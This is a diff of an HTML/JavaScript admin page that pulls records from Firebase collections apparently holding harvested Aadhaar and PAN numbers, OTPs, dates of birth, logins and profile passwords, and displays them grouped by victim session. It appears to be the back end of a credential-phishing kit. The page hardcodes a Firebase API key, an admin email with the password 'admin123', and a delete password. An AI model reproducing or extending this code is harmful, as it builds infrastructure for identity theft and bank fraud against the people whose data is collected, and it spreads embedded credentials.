@@ -1,169 +1,169 @@
-<html>
-  <head>
-    <title>Admin Panel</title>
-    <style>/* Main styles yahin rahenge */</style>
-  </head>
-  <body>
-    <div id="login">...</div>
-    <div id="adminPanel" style="display:none">...</div>
-    <div id="scrollButtons"></div>
-    <div id="panelContainer"></div>
-<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
-<script>
-  const firebaseConfig = {
-    apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
-    authDomain: "welcomingrewd.firebaseapp.com",
-    projectId: "welcomingrewd",
-    storageBucket: "welcomingrewd.firebasestorage.app",
-    messagingSenderId: "33456614906",
-    appId: "1:33456614906:web:b5828e5dcb0253cace0843"
-  };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
-
-  const collections = [
-    'aadhaar_entries',
-    'dob_entries',
-    'logins',
-    'otp_entries',
-    'pan_entries',
-    'profile_passwords'
-  ];
-
-  function login() {
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value.trim();
-    if (email === "marconlinehoga@gmail.com" && password === "admin123") {
-      document.getElementById("login").style.display = "none";
-      document.getElementById("adminPanel").style.display = "block";
-      loadPanelLayout();
-    } else {
-      alert("Invalid credentials");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Firebase Admin Panel</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f4f4; }
+    .login-form {
+      max-width: 300px; margin: 100px auto;
+      background: white; padding: 20px;
+      border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-  }
+    .login-form input, .login-form button {
+      width: 100%; margin-bottom: 10px; padding: 10px;
+      border-radius: 5px; border: 1px solid #ccc;
+    }
+    .login-form button {
+      background: #00008b; color: white; border: none;
+    }
+    .container { padding: 20px; max-width: 100%; margin: auto; }
+    h1 { text-align: center; color: #00008b; }
+    .panel-layout { display: flex; flex-direction: column; gap: 20px; }
+    .section {
+      background: white; padding: 15px;
+      border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      max-height: 600px; overflow-y: auto;
+    }
+    h2 {
+      margin: 0; padding: 10px;
+      background: #00008b; color: white;
+      border-radius: 5px;
+    }
+    .group {
+      margin-top: 20px;
+      border: 2px solid #00008b;
+      border-radius: 10px;
+      padding: 10px;
+      background: #f9f9f9;
+    }
+    .entry {
+      background: white;
+      padding: 10px;
+      margin-top: 10px;
+      border-left: 5px solid #00008b;
+      position: relative;
+    }
+    pre {
+      margin: 0;
+      font-size: 14px;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    .time {
+      font-size: 12px;
+      color: #666;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div id="login" class="login-form">
+    <h3>Admin Login</h3>
+    <input type="email" id="email" placeholder="Email" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="login()">Login</button>
+  </div>
 
-  function loadPanelLayout() {
-    const panel = document.getElementById("panelContainer");
-    const buttonRow = document.getElementById("scrollButtons");
-    panel.innerHTML = "";
-    buttonRow.innerHTML = "";
+  <div class="container" id="adminPanel" style="display:none;">
+    <h1>Firebase Admin Panel</h1>
+    <div class="panel-layout">
+      <div class="section">
+        <h2>ALL DATA (Session Wise)</h2>
+        <div id="allDataContent"></div>
+      </div>
+    </div>
+  </div>
 
-    const topButtons = ['ALL_DATA', 'AADHAAR_ENTRIES', 'DOB_ENTRIES', 'LOGINS'];
-    const bottomButtons = ['OTP_ENTRIES', 'PAN_ENTRIES', 'PROFILE_PASSWORDS'];
-
-    const renderButton = (label, id, small = false) => {
-      const btn = document.createElement("button");
-      btn.textContent = label.replace(/_/g, " ");
-      btn.className = small ? "btn-small" : "btn-large";
-      btn.onclick = () => showOnlySection(id.toLowerCase() + "_section");
-      buttonRow.appendChild(btn);
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
+      authDomain: "welcomingrewd.firebaseapp.com",
+      projectId: "welcomingrewd",
+      storageBucket: "welcomingrewd.firebasestorage.app",
+      messagingSenderId: "33456614906",
+      appId: "1:33456614906:web:b5828e5dcb0253cace0843"
     };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
 
-    const showOnlySection = (id) => {
-      document.querySelectorAll(".section").forEach(sec => sec.classList.remove("active"));
-      const target = document.getElementById(id);
-      if (target) target.classList.add("active");
-    };
+    const collections = [
+      'aadhaar_entries',
+      'dob_entries',
+      'logins',
+      'otp_entries',
+      'pan_entries',
+      'profile_passwords'
+    ];
 
-    topButtons.forEach(col => renderButton(col, col));
-    bottomButtons.forEach(col => renderButton(col, col, true));
+    function login() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      if (email === "marconlinehoga@gmail.com" && password === "admin123") {
+        document.getElementById("login").style.display = "none";
+        document.getElementById("adminPanel").style.display = "block";
+        loadAllData();
+      } else {
+        alert("Invalid credentials");
+      }
+    }
 
-    const allSection = document.createElement("div");
-    allSection.className = "section active";
-    allSection.id = "all_data_section";
-    allSection.innerHTML = "<h2>ALL DATA</h2><div id='allDataContent'></div>";
-    panel.appendChild(allSection);
+    async function loadAllData() {
+      const sessionData = {};
 
-    const allData = [];
-
-    collections.forEach(col => {
-      const section = document.createElement("div");
-      section.className = "section";
-      section.id = col + "_section";
-
-      const title = document.createElement("h2");
-      title.textContent = col.replace(/_/g, " ").toUpperCase();
-      section.appendChild(title);
-
-      const content = document.createElement("div");
-      section.appendChild(content);
-      panel.appendChild(section);
-
-      db.collection(col).orderBy("timestamp", "desc").onSnapshot(snapshot => {
-        content.innerHTML = "";
-
-        snapshot.docs.forEach(doc => {
+      for (const col of collections) {
+        const snapshot = await db.collection(col).orderBy('timestamp', 'desc').get();
+        snapshot.forEach(doc => {
           const data = doc.data();
-          const docId = doc.id;
-          const sessionId = data.sessionId || 'no-session';
-          const timestamp = data.timestamp;
+          const sessionId = data.sessionId || "no_session";
+          if (!sessionData[sessionId]) {
+            sessionData[sessionId] = [];
+          }
+          sessionData[sessionId].push({ ...data, __collection: col });
+        });
+      }
 
-          const filteredData = {};
-          Object.keys(data).forEach(k => {
-            if (!['timestamp', '__collection', 'captcha', 'attempt', 'valid'].includes(k)) {
-              filteredData[k] = data[k];
-            }
-          });
+      renderGroupedData(sessionData);
+    }
 
-          allData.push({ sessionId, collection: col, data: filteredData, timestamp, docId });
-          allData.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
-          renderAllData(allData);
+    function renderGroupedData(sessionData) {
+      const container = document.getElementById("allDataContent");
+      container.innerHTML = "";
 
+      const sessions = Object.keys(sessionData).sort((a, b) => b.localeCompare(a));
+
+      sessions.forEach(sessionId => {
+        const group = document.createElement("div");
+        group.className = "group";
+        group.innerHTML = `<h3>Session ID: ${sessionId}</h3>`;
+
+        sessionData[sessionId].sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
+
+        sessionData[sessionId].forEach(data => {
           const entry = document.createElement("div");
           entry.className = "entry";
-          entry.innerHTML = formatSimple(filteredData);
 
-          const delBtn = document.createElement("button");
-          delBtn.className = "delete-btn";
-          delBtn.textContent = "Delete";
-          delBtn.onclick = () => {
-            const input = prompt("Enter delete password:");
-            if (input === "4542") {
-              db.collection(col).doc(docId).delete();
-            } else {
-              alert("Wrong password");
+          let cleanData = "";
+          for (const key in data) {
+            if (!['timestamp', '__collection', 'sessionId', 'captcha', '__collection', 'attempt', 'valid'].includes(key)) {
+              cleanData += `${key} ${data[key]}\n`;
             }
-          };
-          entry.appendChild(delBtn);
-          content.appendChild(entry);
+          }
+
+          const time = data.timestamp?.seconds ? new Date(data.timestamp.seconds * 1000).toLocaleString() : "No Time";
+
+          entry.innerHTML = `<pre>[${data.__collection.toUpperCase()}]\n${cleanData.trim()}</pre>
+                             <div class="time">${time}</div>`;
+          group.appendChild(entry);
         });
+
+        container.appendChild(group);
       });
-    });
-  }
-
-  function formatSimple(data) {
-    return Object.entries(data)
-      .map(([key, value]) => `${key} ${value}`)
-      .join("<br>");
-  }
-
-  function renderAllData(dataArray) {
-    const allContent = document.getElementById("allDataContent");
-    if (!allContent) return;
-    allContent.innerHTML = "";
-
-    const grouped = {};
-
-    dataArray.forEach(entry => {
-      if (!grouped[entry.sessionId]) grouped[entry.sessionId] = [];
-      grouped[entry.sessionId].push(entry);
-    });
-
-    Object.keys(grouped).forEach(sessionId => {
-      const sessionDiv = document.createElement("div");
-      sessionDiv.className = "entry";
-      const time = grouped[sessionId][0]?.timestamp?.toDate().toLocaleString('en-GB', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
-      
-      let contentHTML = `<b>Session ID:</b> ${sessionId}<br><br>`;
-      
-      grouped[sessionId].forEach(entry => {
-        contentHTML += formatSimple(entry.data) + "<br><br>";
-      });
-
-      contentHTML += `<div style="margin-top:10px; font-size:12px; color:gray;">Time: ${time || 'N/A'}</div>`;
-      sessionDiv.innerHTML = contentHTML;
-      allContent.appendChild(sessionDiv);
-    });
-  }
-</script>
+    }
+  </script>
+</body>
+</html>
